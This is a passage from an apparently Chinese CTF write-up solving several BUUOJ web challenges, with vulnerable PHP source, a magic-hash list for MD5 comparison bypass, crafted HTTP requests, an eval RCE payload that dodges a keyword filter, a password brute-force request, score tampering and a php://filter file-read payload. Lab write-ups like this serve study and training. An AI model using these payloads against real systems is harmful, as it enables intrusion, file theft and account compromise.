</span></span><span class=line><span class=cl>    <span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope,this is level 5&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>放点资料，就不说了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$md5 						md5($md5)
</span></span><span class=line><span class=cl>s878926199a					0e545993274517709034328855841020
</span></span><span class=line><span class=cl>s155964671a					0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s214587387a					0e848240448830537924465865611904
</span></span><span class=line><span class=cl>s214587387a					0e848240448830537924465865611904
</span></span><span class=line><span class=cl>s878926199a					0e545993274517709034328855841020
</span></span><span class=line><span class=cl>s1091221200a					0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s1885207154a					0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s1502113478a					0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s1885207154a					0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s1836677006a					0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s155964671a					0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1184209335a					0e072485820392773389523109082030
</span></span><span class=line><span class=cl>s1665632922a					0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s1502113478a					0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s1836677006a					0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s1091221200a					0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s155964671a					0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1502113478a					0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s155964671a					0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1665632922a					0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s155964671a					0e342768416822451524974117254469
</span></span><span class=line><span class=cl>s1091221200a					0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s1836677006a					0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s1885207154a					0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s532378020a					0e220463095855511507588041205815
</span></span><span class=line><span class=cl>s878926199a					0e545993274517709034328855841020
</span></span><span class=line><span class=cl>s1091221200a					0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s214587387a					0e848240448830537924465865611904
</span></span><span class=line><span class=cl>s1502113478a					0e861580163291561247404381396064
</span></span><span class=line><span class=cl>s1091221200a					0e940624217856561557816327384675
</span></span><span class=line><span class=cl>s1665632922a					0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s1885207154a					0e509367213418206700842008763514
</span></span><span class=line><span class=cl>s1836677006a					0e481036490867661113260034900752
</span></span><span class=line><span class=cl>s1665632922a					0e731198061491163073197128363787
</span></span><span class=line><span class=cl>s878926199a					0e545993274517709034328855841020
</span></span><span class=line><span class=cl>QNKCDZO						0e830400451993494058024219903391
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81/?key1=s878926199a&amp;key2=s155964671a&amp;key4[]=1&amp;key5=2024a</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://d213666f-7c87-4020-99ea-0e83c2387a11.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>key3%5B%5D=1&amp;flag5=+
</span></span></code></pre></td></tr></table></div></div><h2 id=rce>R!C!E!</h2><p>依旧经典</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>])</span><span class=o>&amp;&amp;</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;e_v.a.l&#39;</span><span class=p>])){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$password</span><span class=o>=</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$code</span><span class=o>=</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;e_v.a.l&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=nx>substr</span><span class=p>(</span><span class=nv>$password</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=mi>6</span><span class=p>)</span><span class=o>===</span><span class=s2>&#34;c4d038&#34;</span><span class=p>){</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/flag|system|pass|cat|ls/i&#34;</span><span class=p>,</span><span class=nv>$code</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>            <span class=k>eval</span><span class=p>(</span><span class=nv>$code</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>过了md5就可以RCE</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>100000000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>h</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>h</span><span class=o>.</span><span class=n>startswith</span><span class=p>(</span><span class=s1>&#39;c4d038&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=n>h</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>password=114514&amp;&amp;e[v.a.l=echo `tac /f*`;
</span></span></code></pre></td></tr></table></div></div><h2 id=easylogin>EasyLogin</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;passwords.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;r&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>pwds</span> <span class=o>=</span> <span class=p>[</span><span class=n>line</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=k>for</span> <span class=n>line</span> <span class=ow>in</span> <span class=n>f</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;passwords_md5.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>,</span> <span class=n>encoding</span><span class=o>=</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pwd</span> <span class=ow>in</span> <span class=n>pwds</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>        <span class=n>md5val</span> <span class=o>=</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>pwd</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>md5val</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/signin.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>node5.buuoj.cn:27475</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://node5.buuoj.cn:27475</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>power=hacker; token=</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://node5.buuoj.cn:27475/signin.php</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>50</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>un=admin&amp;pw={{file:line(D:\Burpsuite\密码合集\passwords_md5.txt)}}&amp;rem=0
</span></span></code></pre></td></tr></table></div></div><p>登录进去之后没什么用，爆破出来是<code>admin\000000</code>，登录的时候抓包获得了flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/passport/9963b7428698fdf50f4c66c7db8ff8e113c5b1e47244da406411476e536259f1.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>node5.buuoj.cn:27475</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>power=hacker; token=</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://node5.buuoj.cn:27475/signin.php</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://node5.buuoj.cn:27475</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>89</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>passport=OWY1OWM3fGFkbWlufGIxZWE3M3w2NzBiMTQ3MjhhZDk5MDJhZWNiYTMyZTIyZmE0ZjZiZHw5YmY2ZXww
</span></span></code></pre></td></tr></table></div></div><h2 id=游戏高手>游戏高手</h2><p>看了前端的js代码是和后端的php连着的，可以直接控制台给分数然后over就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>var</span> <span class=nx>gameScore</span><span class=o>=</span><span class=mi>10000000</span><span class=p>;</span><span class=nx>gameover</span><span class=p>();</span>
</span></span></code></pre></td></tr></table></div></div><p>但是™的发现出题人根本前后端没分离</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/api.php</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span>
</span></span><span class=line><span class=cl><span class=n>Pragma</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>no-cache</span>
</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span>
</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81</span>
</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/json</span>
</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://968133cd-3204-48d4-9f6b-1e2cee247f8e.node5.buuoj.cn:81/</span>
</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>*/*</span>
</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>18</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=nt>&#34;score&#34;</span><span class=p>:</span><span class=mi>10000000</span><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这样也可以</p><h2 id=include-00>include 0。0</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=c1>// FLAG in the flag.php
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$file</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$file</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=o>!</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/base|rot/i&#39;</span><span class=p>,</span><span class=nv>$file</span><span class=p>)){</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=k>include</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span><span class=k>else</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;nope&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> nope
</span></span></span></code></pre></td></tr></table></div></div><p>直接用iconv就行了</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>?file=php://filter/read=convert.iconv.UTF-8.UTF-16/resource=flag.php
</span></span></code></pre></td></tr></table></div></div><p><code>convert.iconv.*</code>的使用方式有两种</p><ul><li>一种是用<code>.</code></li><li>一种是用<code>/</code></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;
</span></span></code></pre></td></tr></table></div></div><p>这题里面的就是把文件的字符编码从<code>UTF-8</code>转换成<code>UTF-16</code>，支持的字符编码有</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>UCS-4*
</span></span><span class=line><span class=cl>UCS-4BE
</span></span><span class=line><span class=cl>UCS-4LE*
</span></span><span class=line><span class=cl>UCS-2
</span></span><span class=line><span class=cl>UCS-2BE
</span></span><span class=line><span class=cl>UCS-2LE
</span></span><span class=line><span class=cl>UTF-32*
</span></span><span class=line><span class=cl>UTF-32BE*
</span></span><span class=line><span class=cl>UTF-32LE*
</span></span><span class=line><span class=cl>UTF-16*
</span></span><span class=line><span class=cl>UTF-16BE*
</span></span><span class=line><span class=cl>UTF-16LE*
</span></span><span class=line><span class=cl>UTF-7
</span></span><span class=line><span class=cl>UTF7-IMAP
</span></span><span class=line><span class=cl>UTF-8*
</span></span><span class=line><span class=cl>ASCII*
</span></span><span class=line><span class=cl>EUC-JP*
</span></span><span class=line><span class=cl>SJIS*
</span></span><span class=line><span class=cl>eucJP-win*
</span></span><span class=line><span class=cl>SJIS-win*
</span></span><span class=line><span class=cl>ISO-2022-JP
</span></span><span class=line><span class=cl>ISO-2022-JP-MS
</span></span><span class=line><span class=cl>CP932
</span></span><span class=line><span class=cl>CP51932
</span></span><span class=line><span class=cl>SJIS-mac (alias: MacJapanese)
</span></span><span class=line><span class=cl>SJIS-Mobile#DOCOMO (alias: SJIS-DOCOMO)
</span></span><span class=line><span class=cl>SJIS-Mobile#KDDI (alias: SJIS-KDDI)
</span></span><span class=line><span class=cl>SJIS-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)
</span></span><span class=line><span class=cl>UTF-8-Mobile#DOCOMO (alias: UTF-8-DOCOMO)
</span></span><span class=line><span class=cl>UTF-8-Mobile#KDDI-A
</span></span><span class=line><span class=cl>UTF-8-Mobile#KDDI-B (alias: UTF-8-KDDI)
</span></span><span class=line><span class=cl>UTF-8-Mobile#SOFTBANK (alias: UTF-8-SOFTBANK)
</span></span><span class=line><span class=cl>ISO-2022-JP-MOBILE#KDDI (alias: ISO-2022-JP-KDDI)
</span></span><span class=line><span class=cl>JIS
</span></span><span class=line><span class=cl>JIS-ms
</span></span><span class=line><span class=cl>CP50220
</span></span><span class=line><span class=cl>CP50220raw
</span></span><span class=line><span class=cl>CP50221
</span></span><span class=line><span class=cl>CP50222
</span></span><span class=line><span class=cl>ISO-8859-1*
</span></span><span class=line><span class=cl>ISO-8859-2*
</span></span><span class=line><span class=cl>ISO-8859-3*
</span></span><span class=line><span class=cl>ISO-8859-4*
</span></span><span class=line><span class=cl>ISO-8859-5*
</span></span><span class=line><span class=cl>ISO-8859-6*
</span></span><span class=line><span class=cl>ISO-8859-7*
</span></span><span class=line><span class=cl>ISO-8859-8*
</span></span><span class=line><span class=cl>ISO-8859-9*
</span></span><span class=line><span class=cl>ISO-8859-10*
</span></span><span class=line><span class=cl>ISO-8859-13*
</span></span><span class=line><span class=cl>ISO-8859-14*
</span></span><span class=line><span class=cl>ISO-8859-15*
